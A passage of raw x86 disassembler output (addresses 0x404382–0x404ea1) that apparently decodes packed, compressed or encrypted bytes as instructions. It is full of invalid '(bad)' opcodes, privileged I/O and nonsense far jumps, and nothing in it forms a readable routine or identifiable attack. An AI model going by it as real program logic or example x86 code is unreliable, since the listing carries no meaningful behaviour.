  404382:	imul   ebx,DWORD PTR [edi],0x5cc0e432
  404388:	js     0x404390
  40438a:	ret    
  40438b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40438c:	lods   al,BYTE PTR ds:[esi]
  40438d:	idiv   eax
  40438f:	jmp    FWORD PTR [ebx-0x206e0709]
  404395:	adc    ch,BYTE PTR [edi+0x38f3713]
  40439b:	push   0xffffff8e
  40439d:	(bad)
  4043a1:	ror    DWORD PTR [ebx+0x23bea604],cl
  4043a7:	mul    BYTE PTR [ebp+0x79a08dbe]
  4043ad:	je     0x40440a
	...
  4043d7:	add    bl,ch
  4043d9:	icebp  
  4043da:	push   es
  4043db:	dec    esi
  4043dc:	xor    al,0x5b
  4043de:	sub    ch,al
  4043e0:	sub    eax,0xd68f335c
  4043e5:	sub    al,0x51
  4043e7:	out    0xc4,eax
  4043e9:	sub    al,0x51
  4043eb:	mov    DWORD PTR [eax+0x58d38740],esp
  4043f1:	shr    dl,cl
  4043f3:	pop    ecx
  4043f4:	add    BYTE PTR [edx-0x7de0edd6],bl
  4043fa:	bound  edi,QWORD PTR [ebp-0x41359b11]
  404400:	dec    edi
  404401:	gs ins BYTE PTR es:[edi],dx
  404403:	sbb    BYTE PTR [ebx],0x3d
  404406:	clc    
  404407:	xchg   ebx,eax
  404408:	neg    DWORD PTR [ebx-0x59]
  40440b:	repz pop esp
  40440d:	fwait
  40440e:	out    dx,al
  40440f:	push   es
  404410:	pop    edi
  404411:	aam    0x2
  404413:	div    DWORD PTR [esp+edi*1-0xf]
  404417:	mul    BYTE PTR [esi+ecx*8+0x55]
  40441b:	adc    ecx,DWORD PTR [edi+0x1fb880ea]
  404421:	or     DWORD PTR ds:0xea4f5ec5,edx
  404427:	rcl    DWORD PTR [edi-0x40e59d],cl
  40442d:	fs cli 
  40442f:	mov    esi,0x89eecfa9
  404434:	(bad)  
  404436:	mov    es,WORD PTR [esi]
  404438:	fisub  DWORD PTR [edx]
  40443a:	test   al,0xc4
	...
  404464:	add    BYTE PTR ds:0x168eb35c,cl
  40446a:	sub    al,0xa1
  40446c:	out    0x14,al
  40446e:	sub    al,0x91
  404470:	mov    BYTE PTR [eax-0x37f437c1],ch
  404476:	adc    edx,ebp
  404478:	pop    ecx
  404479:	cmp    BYTE PTR [edx-0x7de0ee56],bl
  40447f:	add    BYTE PTR [edx-0x58],ah
  404482:	sub    edi,ebx
  404484:	retf   0x2ba1
  404487:	stc    
  404488:	je     0x4044e5
  40448a:	pop    eax
  40448b:	bound  eax,QWORD PTR [esi+esi*1]
  40448e:	imul   eax,DWORD PTR [ebx],0xc09acbaf
  404494:	in     al,0x1a
  404496:	pushf  
  404497:	mov    eax,DWORD PTR [edx-0x4e]
  40449a:	and    eax,DWORD PTR [bx+si-0x56]
  40449e:	lea    ebx,fs:[ebp+0xe]
  4044a2:	sbb    esi,DWORD PTR [ebx+0x565bdfa9]
  4044a8:	add    DWORD PTR [ecx-0x64],esp
  4044ab:	or     edx,ebp
  4044ad:	outs   dx,DWORD PTR ds:[esi]
  4044ae:	sar    eax,cl
  4044b0:	fcmove st,st(1)
  4044b2:	cmp    edi,ebx
  4044b4:	fcmovb st,st(7)
  4044b6:	int    0x8c
  4044b8:	not    al
  4044ba:	add    al,0x5e
  4044bc:	(bad)  
  4044bd:	sbb    dl,BYTE PTR [ecx]
  4044bf:	sub    al,0x28
  4044c1:	pusha  
  4044c2:	push   eax
  4044c3:	add    esp,DWORD PTR [ebx]
  4044c5:	xchg   edx,eax
  4044c6:	fs xor esp,eax
	...
  4044f1:	add    BYTE PTR [ecx+0x67],al
  4044f4:	xor    esp,ebx
  4044f6:	fwait
  4044f7:	mov    esi,0xa85d831f
  4044fc:	jmp    0xc3da6aeb
  404501:	frstor [eax]
  404503:	or     BYTE PTR [ebx+0x236429c0],0xb3
  40450a:	xor    DWORD PTR [edx-0x73],esp
  40450d:	gs sbb eax,0xedd60ffe
  404513:	pop    edx
  404514:	inc    esi
  404515:	cmc    
  404516:	ficomp WORD PTR [ebx-0x2d1f15fb]
  40451c:	sti    
  40451d:	fcmovb st,st(7)
  40451f:	cmp    bh,cl
  404521:	add    BYTE PTR [esi-0x356b7261],dh
  404527:	pop    es
  404528:	adc    al,0x44
  40452a:	not    DWORD PTR [edi+0x56]
  40452d:	sub    BYTE PTR [ebp+edx*4-0x2feafcf7],dh
  404534:	clc    
  404535:	xor    edi,DWORD PTR [edi]
  404537:	js     0x404533
  404539:	xor    ebp,DWORD PTR [ebp-0x2a]
  40453c:	mov    WORD PTR [edi],cs
  40453e:	xor    al,0xb9
  404540:	mov    eax,ds:0x3c14c6d8
  404545:	rol    DWORD PTR [ecx+edx*2],0x3
  404549:	retf   0x9d3e
  40454c:	xor    edi,ecx
  40454e:	push   ss
  40454f:	lahf   
  404550:	xor    edi,edx
  404552:	adc    bl,al
  404554:	pop    ds
  404555:	enter  0x0,0x0
	...
  40457d:	add    BYTE PTR [eax],al
  40457f:	ds mov bh,ah
  404582:	add    edx,ebx
  404584:	dec    edx
  404585:	rol    ebx,0x89
  404588:	push   edi
  404589:	(bad)  [ebx+0x23fa681c]
  40458f:	pop    ds
  404590:	push   0x5bf98df8
  404595:	out    0xcd,al
  404597:	adc    al,0x7a
  404599:	add    al,BYTE PTR [esi+0x29]
  40459c:	call   0xfb8b:0x974605c0
  4045a3:	es lahf 
  4045a5:	and    edi,ecx
  4045a7:	mov    al,es:0x8c5a948d
  4045ad:	pop    es
  4045ae:	aaa    
  4045af:	xchg   BYTE PTR [edi+0x56],dl
  4045b2:	cmp    BYTE PTR [eax+ebx*4+0x9],dh
  4045b6:	add    eax,DWORD PTR [ebp-0x40cc0731]
  4045bc:	jbe    0x4045b8
  4045be:	xor    edi,DWORD PTR [ebp+0x1c0f8cd4]
  4045c4:	in     eax,dx
  4045c5:	add    eax,0x497108d5
  4045ca:	or     al,0xdd
  4045cc:	mov    dl,0x9
  4045ce:	add    esp,esi
  4045d0:	call   0x91257991
  4045d5:	mov    ebx,0x96fee633
  4045da:	pop    ds
  4045db:	leave  
  4045dc:	pop    edi
  4045dd:	pop    ebp
  4045de:	inc    ebp
  4045df:	pop    ds
  4045e0:	sahf   
  4045e1:	jecxz  0x4045a3
	...
  40460b:	add    bh,bl
  40460d:	pop    edi
  40460e:	add    al,0xd9
  404610:	xchg   edi,eax
  404611:	or     dh,ah
  404613:	cli    
  404614:	call   FWORD PTR [ecx]
  404616:	hlt    
  404617:	clc    
  404618:	mov    eax,ds:0xb504fff7
  40461d:	adc    BYTE PTR [edx+0x3],ch
  404620:	pop    edx
  404621:	push   0x7121c0c2
  404626:	les    ecx,FWORD PTR [ebx+0x23bb8097]
  40462c:	test   DWORD PTR [eax+0x64a88dbc],eax
  404632:	mov    ebx,0x4578ba3
  404637:	push   esi
  404638:	and    al,0x33
  40463a:	lds    ecx,FWORD PTR [ecx]
  40463c:	pop    ds
  40463d:	inc    esp
  40463e:	mov    eax,?
  404640:	das    
  404641:	push   0xffffffe3
  404643:	cli    
  404644:	(bad)  
  404646:	mov    DWORD PTR [ebx+eiz*1-0x3c90fd65],ecx
  40464d:	jo     0x404694
  40464f:	sbb    al,0x5d
  404651:	mov    dl,0x6
  404653:	add    esp,DWORD PTR [esi-0x18]
  404656:	mov    ecx,0xbc503533
  40465b:	xor    esp,DWORD PTR [esi]
  40465d:	not    BYTE PTR [edi-0x15c069e1]
  404663:	mov    WORD PTR [edi],ds
  404665:	pop    ebx
  404666:	inc    edi
  404667:	hlt    
  404668:	fcomp  QWORD PTR [eax-0x2f1afd0b]
  40466e:	nop
  40466f:	repz add BYTE PTR [eax],al
	...
  404696:	add    BYTE PTR [eax],al
  404698:	add    BYTE PTR ds:0xa0899229,al
  40469e:	push   esp
  40469f:	sub    edi,ebp
  4046a1:	cmc    
  4046a2:	pop    esp
  4046a3:	jmp    0x1f00:0xa99a103d
  4046aa:	cwde   
  4046ab:	bound  edi,QWORD PTR [ebx-0x43e59df1]
  4046b1:	mov    eax,ds:0xd284f6c7
  4046b6:	jmp    0xc228:0x3b6a036d
  4046bd:	daa    
  4046be:	pop    eax
  4046bf:	sbb    DWORD PTR [ebx-0xcbdd74c],ecx
  4046c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c6:	into   
  4046c7:	gs pop es
  4046c9:	(bad)  
  4046ca:	stc    
  4046cb:	dec    ebx
  4046cc:	sub    DWORD PTR [edi],ebx
  4046ce:	or     eax,0x4b5dc4d5
  4046d3:	jmp    0x4fbb:0xda6197c9
  4046da:	bound  ebx,QWORD PTR [eax+ebx*4+0x1b]
  4046de:	dec    edi
  4046df:	shl    DWORD PTR [eax-0x460a78f],0x5c
  4046e6:	cwde   
  4046e7:	fiadd  WORD PTR [edx]
  4046e9:	inc    ebp
  4046ea:	shl    al,1
  4046ec:	repnz push ebp
  4046ee:	sub    dl,ah
  4046f0:	mov    BYTE PTR [eax-0x7555daac],bl
  4046f6:	mov    bh,0xea
  4046f8:	cmp    eax,0xffa99a18
	...
  404725:	add    BYTE PTR [esi],bl
  404727:	cwde   
  404728:	jb     0x4046e4
  40472a:	out    dx,eax
  40472b:	popa   
  40472c:	cli    
  40472d:	mov    ebx,0xde00c799
  404732:	mov    al,0x8b
  404734:	fisub  WORD PTR [edx]
  404736:	pop    ds
  404737:	add    eax,0x4fdda810
  40473c:	add    edi,DWORD PTR [ecx-0x6dcc9d6a]
  404742:	push   cs
  404743:	bound  ecx,QWORD PTR [ebp+0x4afb225d]
  404749:	inc    edx
  40474a:	rcl    DWORD PTR [edi+0x4e],0xdd
  40474e:	loopne 0x4046e9
  404750:	adc    dl,ch
  404752:	aad    0xcf
  404754:	cli    
  404755:	mov    edx,0x74f92797
  40475a:	stos   DWORD PTR es:[edi],eax
  40475b:	cmp    esi,DWORD PTR [eax-0x63]
  40475e:	push   edx
  40475f:	popf   
  404760:	add    esi,DWORD PTR [edi-0x93c6549]
  404766:	push   ds
  404767:	or     BYTE PTR [ebx+0x3361ae40],0x42
  40476e:	xchg   esp,eax
  40476f:	(bad)  
  404770:	pop    es
  404771:	das    
  404772:	jmp    0x5a2a7036
  404777:	daa    
  404778:	shr    DWORD PTR [ecx],0x93
  40477b:	pop    eax
  40477c:	ret    
  40477d:	jb     0x404745
  40477f:	daa    
  404780:	stc    
  404781:	fcmovb st,st(7)
  404783:	int    0x94
  404785:	div    BYTE PTR [ebp+0x13a133]
	...
  4047b3:	push   ds
  4047b4:	inc    ebp
  4047b5:	shr    DWORD PTR [ebx],0x16
  4047b8:	pop    eax
  4047b9:	shl    BYTE PTR [edx-0x59],1
  4047bc:	daa    
  4047bd:	sti    
  4047be:	mov    edx,0xf68ccd95
  4047c3:	shr    BYTE PTR [edx],cl
  4047c5:	out    dx,eax
  4047c6:	mov    ch,0x1d
  4047c8:	or     eax,0x4a5fa80c
  4047cd:	add    esp,DWORD PTR [ebx+0x3360a5]
  4047d3:	pop    ebp
  4047d4:	imul   edi,eax,0x545c98d
  4047da:	sbb    eax,0x5e035abd
  4047df:	in     eax,dx
  4047e0:	sbb    eax,0x360617c3
  4047e5:	mov    edi,ecx
  4047e7:	out    0x14,al
  4047e9:	xor    edi,ebx
  4047eb:	js     0x4047c8
  4047ed:	push   es
  4047ee:	cmp    DWORD PTR [ebp+0x4303d92b],esi
  4047f4:	cmp    eax,eax
  4047f6:	rol    BYTE PTR [ecx],0x5c
  4047f9:	ret    
  4047fa:	mov    ebp,DWORD PTR [esi+0x4c]
  4047fd:	clc    
  4047fe:	xor    ecx,DWORD PTR [ebp-0x1e]
  404801:	xchg   ebx,eax
  404802:	pop    ss
  404803:	pusha  
  404804:	neg    dl
  404806:	out    0xb6,al
  404808:	test   al,0x30
  40480a:	shl    edi,0x63
  40480d:	add    edx,eax
  40480f:	ds pop ss
  404811:	xor    edi,ebx
  404813:	mov    dh,0x14
  404815:	lea    ecx,[eax+eax*1+0x0]
	...
  404840:	mov    edx,0xcaa27c16
  404845:	pop    ebx
  404846:	dec    esi
  404847:	cmp    al,0x44
  404849:	push   ds
  40484a:	adc    BYTE PTR [ebx],al
  40484c:	dec    edi
  40484d:	in     al,0xf9
  40484f:	xor    edi,DWORD PTR ds:0x98df84c
  404855:	jo     0x4048bc
  404857:	push   esi
  404858:	cmp    DWORD PTR [ebx],ebx
  40485a:	add    ebx,DWORD PTR [esi+0x6d]
  40485d:	sbb    eax,0x357617c3
  404862:	mov    edi,0xff0f6aff
  404867:	xor    ecx,DWORD PTR [edi+0x63]
  40486a:	sti    
  40486b:	xor    edi,DWORD PTR [ecx+eiz*8]
  40486e:	add    DWORD PTR [edi],0x1
  404871:	cmp    eax,0x451cf428
  404876:	std    
  404877:	rcr    BYTE PTR [edx+eax*2+0x0],0xc3
  40487c:	jae    0x40489f
  40487e:	mov    ah,0xff
  404880:	sub    edx,DWORD PTR [ebp-0x46]
  404883:	or     esp,DWORD PTR [edx*2+0x30b08db8]
  40488a:	mov    edi,?
  40488c:	inc    esi
  40488d:	test   DWORD PTR [ecx],eax
  40488f:	push   esi
  404890:	sub    BYTE PTR [ebx],al
  404892:	ror    DWORD PTR [edx],0x1f
  404895:	adc    al,0x74
  404897:	(bad)  
  404898:	sti    
  404899:	call   0x4d377c51
  40489e:	mov    ecx,0x87c6e433
  4048a3:	sldt   WORD PTR [eax]
	...
  4048ca:	add    BYTE PTR [eax],al
  4048cc:	add    BYTE PTR [ebx+0x1fab8f24],bh
  4048d2:	jp     0x4048d0
  4048d4:	rcr    ch,0x50
  4048d7:	add    dl,cl
  4048d9:	mov    edi,DWORD PTR [eax+0x74c3ffb4]
  4048df:	mov    esp,0xba74b50b
  4048e4:	lea    edx,[eax-0x706005c0]
  4048ea:	xchg   edi,eax
  4048eb:	add    BYTE PTR [esi+0x8],bl
  4048ee:	add    eax,0x15
  4048f1:	pop    ds
  4048f2:	imul   esi,DWORD PTR [edi+edi*8-0x6d],0xffffff80
  4048f7:	mov    ah,0x33
  4048f9:	xchg   BYTE PTR [eax+edi*4+0x33],cl
  4048fd:	test   DWORD PTR [esi+0xa5f077f],edi
  404903:	pop    eax
  404904:	gs pop ds
  404906:	or     dh,bl
  404908:	rcr    BYTE PTR [ecx+eax*2+0x0],0xc3
  40490d:	mov    ds:0x5bffb350,eax
  404912:	adc    al,0xba
  404914:	or     edx,DWORD PTR [edx+ebx*2+0x1a]
  404918:	scas   eax,DWORD PTR es:[edi]
  404919:	cdq    
  40491a:	out    dx,al
  40491b:	cmc    
  40491c:	xchg   ebp,eax
  40491d:	push   eax
  40491e:	data16 popw es
  404921:	shl    BYTE PTR [esi-0x58],cl
  404924:	(bad)  
  404925:	es pop esi
  404927:	cdq    
  404928:	jae    0x404955
  40492a:	pop    ecx
  40492b:	mov    esi,0xe255efb3
  404930:	lods   eax,DWORD PTR ds:[esi]
	...
  404959:	add    BYTE PTR [edi+0x53],cl
  40495c:	pop    esp
  40495d:	and    BYTE PTR [ebx],0xd6
  404960:	popf   
  404961:	mov    ds:0xdc2f5d0b,eax
  404966:	fcomp  QWORD PTR [edx]
  404968:	out    0x6,al
  40496a:	out    0x18,al
  40496c:	mov    ?,WORD PTR [ebx-0x5445a70d]
  404972:	pop    ss
  404973:	push   edx
  404974:	mov    edx,0xd5f791ad
  404979:	aam    0x79
  40497b:	fbld   TBYTE PTR [ebx+0x7]
  40497e:	jb     0x4049df
  404980:	sub    bh,al
  404982:	xor    DWORD PTR [eax+eax*2+0x73],ebx
  404986:	ret    
  404987:	pop    eax
  404988:	push   esi
  404989:	mov    bl,0xef
  40498b:	push   esp
  40498c:	loop   0x40493c
  40498e:	out    dx,eax
  40498f:	push   ecx
  404990:	je     0x40491a
  404992:	and    ebp,DWORD PTR [eax+0x5c335bbf]
  404998:	scas   eax,DWORD PTR es:[edi]
  404999:	jecxz  0x4049f7
  40499b:	sbb    esp,edi
  40499d:	push   es
  40499e:	pop    edi
  40499f:	sbb    BYTE PTR [esi],ah
  4049a1:	mov    bl,0x8b
  4049a3:	pop    eax
  4049a4:	fisubr DWORD PTR [edi+edx*1-0x565125ad]
  4049ab:	out    dx,eax
  4049ac:	cmc    
  4049ad:	mov    ds:0x707877a,eax
  4049b2:	rcl    BYTE PTR [esi+0x5c16c628],cl
  4049b8:	add    BYTE PTR [ecx],bl
  4049ba:	iret   
  4049bb:	push   edi
  4049bc:	(bad)  
  4049bd:	out    dx,al
	...
  4049e6:	add    BYTE PTR [esi+0x79f2fb8c],cl
  4049ec:	mov    eax,?
  4049ee:	ins    BYTE PTR es:[edi],dx
  4049ef:	ret    
  4049f0:	addr16 adc al,0x2a
  4049f3:	and    esp,edi
  4049f5:	add    bl,BYTE PTR [edi]
  4049f7:	and    BYTE PTR [edx],bl
  4049f9:	shl    esi,0x22
  4049fc:	and    eax,0x586ebebf
  404a01:	(bad)  
  404a02:	cli    
  404a03:	(bad)  
  404a04:	arpl   cx,di
  404a06:	cli    
  404a07:	shl    ebp,0x9b
  404a0a:	push   es
  404a0b:	sub    DWORD PTR [edx+0x8],0x34b91b2f
  404a12:	test   al,0xe2
  404a14:	ins    DWORD PTR es:[edi],dx
  404a15:	add    esi,DWORD PTR [eax-0x7900a792]
  404a1b:	scas   al,BYTE PTR es:[edi]
  404a1c:	mov    edi,edx
  404a1e:	repnz mov dl,0x8b
  404a21:	stc    
  404a22:	mov    fs:0x6aef825f,eax
  404a28:	push   eax
  404a29:	add    ebp,DWORD PTR [edi-0x183fe5d1]
  404a2f:	sbb    bl,BYTE PTR [edi+edi*4]
  404a32:	push   esi
  404a33:	outs   dx,BYTE PTR ds:[esi]
  404a34:	push   edi
  404a35:	call   FWORD PTR [edx]
  404a37:	and    DWORD PTR [ebx-0x8],0x93e57afa
  404a3e:	(bad)  
  404a3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a40:	dec    ecx
  404a41:	cmp    dh,BYTE PTR [edx+eiz*1-0x4f]
  404a45:	sub    al,0x28
  404a47:	pop    ecx
  404a48:	add    edi,DWORD PTR fs:[ecx]
	...
  404a73:	add    BYTE PTR [esi],cl
  404a75:	pop    eax
  404a76:	call   FWORD PTR [esi]
  404a78:	into   
  404a79:	mov    edi,ebx
  404a7b:	loop   0x404a46
  404a7d:	mov    edi,eax
  404a7f:	pop    esp
  404a80:	repz addr16 mov ebx,0x2a350700
  404a87:	add    esi,DWORD PTR [ebx+0x42c1c053]
  404a8d:	pusha  
  404a8e:	retf   0x42bf
  404a91:	or     edi,edi
  404a93:	jmp    DWORD PTR [esi]
  404a95:	pop    es
  404a96:	or     edi,ecx
  404a98:	or     DWORD PTR es:[ebp-0x2d13cd64],ecx
  404a9f:	xchg   BYTE PTR [esi+0x5d],bl
  404aa2:	pop    esi
  404aa3:	and    al,0x74
  404aa5:	sbb    eax,0xd57c0315
  404aaa:	jge    0x404ab4
  404aac:	add    al,0x64
  404aae:	add    DWORD PTR [edi-0x7],ebx
  404ab1:	pop    ecx
  404ab2:	dec    edi
  404ab3:	or     ah,dh
  404ab5:	mov    bl,0xc
  404ab7:	push   DWORD PTR [eax]
  404ab9:	or     ecx,DWORD PTR [ebp-0x76a3ba8a]
  404abf:	jg     0x3c9b49d1
  404ac5:	test   al,0x58
  404ac7:	pop    edi
  404ac8:	add    edx,DWORD PTR [edx]
  404aca:	ret    0xc50c
  404acd:	lods   eax,DWORD PTR ds:[esi]
  404ace:	mov    ebp,esp
  404ad0:	inc    esi
  404ad1:	and    edi,eax
  404ad3:	push   edi
  404ad4:	mov    ebp,DWORD PTR [edi+0x45c7]
	...
  404afe:	add    BYTE PTR [eax],al
  404b00:	add    BYTE PTR [ecx+0x5f],ah
  404b03:	add    BYTE PTR [eax],al
  404b05:	lds    ecx,FWORD PTR [ebx]
  404b07:	jne    0x404b15
  404b09:	push   edx
  404b0a:	sahf   
  404b0b:	clc    
  404b0c:	(bad)  
  404b0d:	mov    eax,0xb5418daa
  404b12:	pop    ecx
  404b13:	and    eax,DWORD PTR [ebp+0x6a]
  404b16:	and    eax,DWORD PTR ds:0x99f054
  404b1c:	mov    esi,ebp
  404b1e:	adc    eax,0xa278c7ef
  404b23:	lea    eax,[ecx+0x1c]
  404b26:	inc    esp
  404b27:	mov    cl,0xdc
  404b29:	mov    dh,0xcc
  404b2b:	leave  
  404b2c:	add    eax,0x43cec8
  404b31:	jmp    0x2347:0x630ff4ef
  404b38:	(bad)  
  404b39:	fld    QWORD PTR [ebx-0x4d]
  404b3c:	loope  0x404bac
  404b3e:	add    DWORD PTR [esp+ebx*1+0x2fc7f97],ebx
  404b45:	loope  0x404b76
  404b47:	sbb    eax,0x7f9fc440
  404b4c:	inc    ecx
  404b4d:	sbb    al,0x74
  404b4f:	pushf  
  404b50:	inc    eax
  404b51:	cmp    DWORD PTR ds:0x106183b0,edx
  404b57:	inc    ebx
  404b58:	call   0x438f3d
  404b5d:	lahf   
  404b5e:	outs   dx,BYTE PTR ds:[esi]
  404b5f:	lods   al,BYTE PTR ds:[esi]
  404b60:	inc    eax
  404b61:	(bad)  
  404b62:	push   ss
  404b63:	jl     0x404bc2
	...
  404b8d:	add    ah,dh
  404b8f:	rol    ah,0x40
  404b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b93:	jle    0x404b91
  404b95:	add    ah,BYTE PTR [ecx-0x20]
  404b98:	push   ebx
  404b99:	push   0x42c778
  404b9e:	ins    BYTE PTR es:[edi],dx
  404b9f:	fmul   QWORD PTR [ecx]
  404ba1:	in     eax,0xd3
  404ba3:	les    eax,FWORD PTR [edx]
  404ba5:	pop    ebp
  404ba6:	enter  0x8485,0x64
  404baa:	xchg   ecx,eax
  404bab:	add    al,BYTE PTR [ebx]
  404bad:	sbb    BYTE PTR [edi+0x1775f898],0xc1
  404bb4:	pushf  
  404bb5:	or     BYTE PTR [eax],dh
  404bb7:	dec    edx
  404bb8:	and    DWORD PTR [ebx+0x42c678],0x1c
  404bbf:	add    DWORD PTR [ebx],ebp
  404bc1:	test   BYTE PTR [eax+edi*4+0x5b1c0003],0x62
  404bc9:	mov    ebx,0x9c1e5583
  404bce:	push   ds
  404bcf:	iret   
  404bd0:	jecxz  0x404b55
  404bd2:	mov    edi,0x1c425bf6
  404bd7:	pop    ebx
  404bd8:	stos   BYTE PTR es:[edi],al
  404bd9:	sub    ebp,DWORD PTR [edx-0x1f]
  404bdc:	mov    ds:0xe96294ff,eax
  404be1:	add    ebx,DWORD PTR [edx+ecx*4]
  404be4:	sbb    edi,DWORD PTR [eax-0x4e9ac3]
  404bea:	push   ebp
  404beb:	stc    
  404bec:	mov    BYTE PTR [ecx+0x19605add],al
	...
  404c1a:	add    BYTE PTR [eax+0x340427e7],dl
  404c20:	mov    dl,0xe9
  404c22:	add    ebx,DWORD PTR [esp+edi*8]
  404c25:	sbb    BYTE PTR [ecx+0x19625b5d],al
  404c2b:	push   0x970427e6
  404c30:	inc    cx
  404c32:	sbb    DWORD PTR [ebp+0x5b],0x212bbbee
  404c39:	out    0xbc,al
  404c3b:	mov    edi,0x1c455cab
  404c40:	loop   0x404c1d
  404c42:	push   edi
  404c43:	xchg   ecx,eax
  404c44:	call   0x4564:0xb3297ce9
  404c4b:	sbb    al,0xfa
  404c4d:	or     al,0x81
  404c4f:	pop    ebp
  404c50:	pop    ebx
  404c51:	jb     0x404c6c
  404c53:	cmp    al,0xe6
  404c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c56:	add    ebp,DWORD PTR [ebx]
  404c58:	and    esp,esi
  404c5a:	mov    ecx,0x455cb77f
  404c5f:	sbb    al,0xe2
  404c61:	(bad)  [ebx]
  404c63:	xchg   ecx,eax
  404c64:	call   0xbc00:0x543019e9
  404c6b:	das    
  404c6c:	ret    
  404c6d:	push   eax
  404c6e:	pop    esp
  404c6f:	loope  0x404ccb
  404c71:	call   0xff950811
  404c76:	ret    0xb3e9
  404c79:	leave  
  404c7a:	sub    ebx,DWORD PTR [ebx+ebx*2]
  404c7d:	push   ebp
  404c7e:	bound  eax,QWORD PTR [eax]
	...
  404ca8:	mov    esp,0xf101c3d8
  404cad:	push   edx
  404cae:	(bad)  
  404caf:	dec    BYTE PTR [edx-0x3bdbfc20]
  404cb5:	in     eax,0x40
  404cb7:	jmp    0x920dbb82
  404cbc:	pushf  
  404cbd:	call   0x60ca:0x6477ee00
  404cc4:	sbb    esp,DWORD PTR [esi]
  404cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc7:	pop    esp
  404cc8:	loopne 0x404d24
  404cca:	mov    ebp,ebx
  404ccc:	pop    esp
  404ccd:	add    ecx,DWORD PTR [ebp+0x759a2028]
  404cd3:	xchg   esp,eax
  404cd4:	sbb    BYTE PTR [ebx],0xff
  404cd7:	scas   al,BYTE PTR es:[edi]
  404cd8:	mov    edx,0x977403df
  404cdd:	in     al,0x40
  404cdf:	jmp    0x6dcdbc5a
  404ce4:	jno    0x404c80
  404ce6:	add    dl,bl
  404ce8:	and    esp,esi
  404cea:	imul   esi,DWORD PTR [edi+0x58],0x5b
  404cee:	xor    edx,ebp
  404cf0:	pushf  
  404cf1:	mov    esi,0x8818288e
  404cf6:	ret    0xdf98
  404cf9:	loope  0x404cfe
  404cfb:	je     0x404d38
  404cfd:	in     eax,0x40
  404cff:	jmp    0x63171b64
  404d04:	or     al,0xab
  404d06:	lea    ebp,[eax+0x34e01f]
	...
  404d34:	add    BYTE PTR [ecx+0xe0040da],al
  404d3a:	dec    ebx
  404d3b:	push   edi
  404d3c:	(bad)  
  404d3d:	les    edx,FWORD PTR [edi-0x1]
  404d40:	xor    eax,0x40da99
  404d45:	or     ah,BYTE PTR [ebx+0x7750fffc]
  404d4b:	lea    eax,[ecx-0x7b]
  404d4e:	aam    0x45
  404d50:	clc    
  404d51:	int3   
  404d52:	repz (bad) 
  404d54:	call   FWORD PTR [edx]
  404d56:	rcl    esi,1
  404d58:	mov    eax,DWORD PTR [edx]
  404d5a:	or     eax,0x390323d2
  404d5f:	push   esp
  404d60:	cld    
  404d61:	sbb    DWORD PTR ds:[ebx],eax
  404d64:	add    al,0xc8
  404d66:	ror    BYTE PTR [ebp+0x455a4541],cl
  404d6c:	clc    
  404d6d:	inc    eax
  404d6e:	loopne 0x404de8
  404d70:	sub    bh,0x5
  404d73:	jne    0x404d71
  404d75:	stos   BYTE PTR es:[edi],al
  404d76:	fwait
  404d77:	clc    
  404d78:	mov    DWORD PTR [eax+0xb],ebx
  404d7b:	rol    esi,0xeb
  404d7e:	sar    esi,cl
  404d80:	mov    eax,esi
  404d82:	push   ds
  404d83:	ret    
  404d84:	add    eax,0x754126f6
  404d89:	leave  
  404d8a:	(bad)  
  404d8b:	in     al,dx
  404d8c:	dec    DWORD PTR [edx+0x7ec68b00]
  404d92:	sub    BYTE PTR [ebx],dh
  404d94:	inc    ebp
  404d95:	cdq    
  404d96:	dec    esp
  404d97:	rol    DWORD PTR [ebx],0x0
	...
  404dc2:	rcl    ecx,0x4
  404dc5:	mov    es,WORD PTR [edi+edx*2]
  404dc8:	add    eax,DWORD PTR [ebp+0x4d]
  404dcb:	pop    edx
  404dcc:	mov    eax,ds:0xff715ceb
  404dd1:	jne    0x404e2c
  404dd3:	rol    BYTE PTR [ebp-0x8],1
  404dd6:	sbb    al,0xbb
  404dd8:	das    
  404dd9:	cld    
  404dda:	fnstsw WORD PTR [edx+0xe]
  404ddd:	mov    esp,DWORD PTR [edx+0x5fc1b1cd]
  404de3:	aaa    
  404de4:	add    al,bl
  404de6:	fisttp QWORD PTR [esi]
  404de8:	sar    DWORD PTR [ecx-0x527e88],cl
  404dee:	xchg   edi,eax
  404def:	cmp    DWORD PTR [ecx+0x55],0xfc464d78
  404df6:	aas    
  404df7:	xchg   ecx,eax
  404df8:	loope  0x404dbf
  404dfa:	pop    ss
  404dfb:	xchg   BYTE PTR [ecx],al
  404dfd:	add    al,0x91
  404dff:	lock jl 0x404e43
  404e02:	sbb    al,0x45
  404e04:	inc    esi
  404e05:	clc    
  404e06:	sbb    DWORD PTR [eax+0x70],ebp
  404e09:	sbb    ebx,DWORD PTR [ebx-0x6c03c9bf]
  404e0f:	jg     0x404dbd
  404e11:	mov    DWORD PTR [ecx+0x12c6c22f],edi
  404e17:	mov    ebp,0x32f8bad
  404e1c:	rol    BYTE PTR ds:0x7541fc1f,0xe7
  404e23:	ficomp DWORD PTR [esi+0xff]
	...
  404e4d:	add    BYTE PTR [eax],al
  404e4f:	adc    ecx,DWORD PTR [ecx]
  404e51:	js     0x404e19
  404e53:	xchg   edi,eax
  404e54:	call   0x35409348
  404e59:	rol    DWORD PTR [ebx],0x20
  404e5c:	mov    edi,0x445d8e67
  404e61:	add    BYTE PTR [ebp-0x1c],al
  404e64:	ss aad 0xc1
  404e67:	jle    0x404e77
  404e69:	lods   al,BYTE PTR ds:[esi]
  404e6a:	jne    0x404e44
  404e6c:	rol    BYTE PTR [esi-0x8],0xa5
  404e70:	inc    esi
  404e71:	scas   eax,DWORD PTR es:[edi]
  404e72:	shl    edx,0x21
  404e75:	js     0x404e75
  404e77:	xchg   edi,eax
  404e78:	pop    edx
  404e79:	pop    edx
  404e7a:	ret    0x57df
  404e7d:	jmp    0x902:0x39c85dcb
  404e84:	stos   DWORD PTR es:[edi],eax
  404e85:	pop    esp
  404e86:	inc    edx
  404e87:	sbb    al,0x5c
  404e89:	cld    
  404e8a:	push   edi
  404e8b:	test   eax,0x5102e99b
  404e90:	mov    bl,0x64
  404e92:	inc    edx
  404e93:	sbb    al,0xe6
  404e95:	mov    ds:0xc5581daf,eax
  404e9a:	jle    0x404e79
  404e9c:	pop    edx
  404e9d:	jb     0x404ee5
  404e9f:	je     0x404efc
  404ea1:	in     al,dx
